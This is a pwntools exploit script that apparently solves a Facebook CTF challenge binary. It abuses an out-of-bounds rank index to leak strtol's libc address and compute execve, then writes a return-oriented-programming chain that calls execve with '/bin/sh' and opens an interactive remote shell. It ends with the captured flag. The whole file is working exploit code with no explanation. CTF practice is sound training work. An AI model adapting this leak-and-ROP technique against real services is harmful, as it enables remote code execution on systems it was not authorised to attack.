from pwn import *


def menu(i):
    p.recvuntil("> ")
    p.sendline(str(i))


def show():
    menu(1)
    ret = []
    for i in range(12):
        leak = p.recvline().strip().split(" ")[1]
        ret.append(leak)
    return ret


def rank(i, r):
    menu(2)
    p.recvuntil("t1tl3> ")
    p.sendline(str(i))
    p.recvuntil("r4nk> ")
    p.sendline(str(r))


libc = ELF("./libc-2.27.so")
p = remote("challenges.fbctf.com", 1339)
context.log_level = "debug"

payload = "17".ljust(8, "\x00")
payload += p64(0x602040)
rank(0, payload)
strtol = u64(show()[0].ljust(8, "\x00"))
LIBC = strtol - libc.symbols["strtol"]
execve = LIBC + libc.symbols["execve"]

pop_rdi_ret = 0x400B43
system_addr = 0x602120
str_bin_sh = 0x602128

payload = str(0x400B3A).ljust(32, "\x00")
payload += p64(execve)
payload += "/bin/sh\x00"

rank(17, payload)
rank(18, 0)
rank(20, system_addr)
rank(21, str_bin_sh)
rank(22, 0)
rank(23, 0)
rank(24, 0x400B20)

menu(3)
context.log_level = "info"
p.interactive()

# flag: fb{wH0_n33ds_pop_rdx_4NYw4y}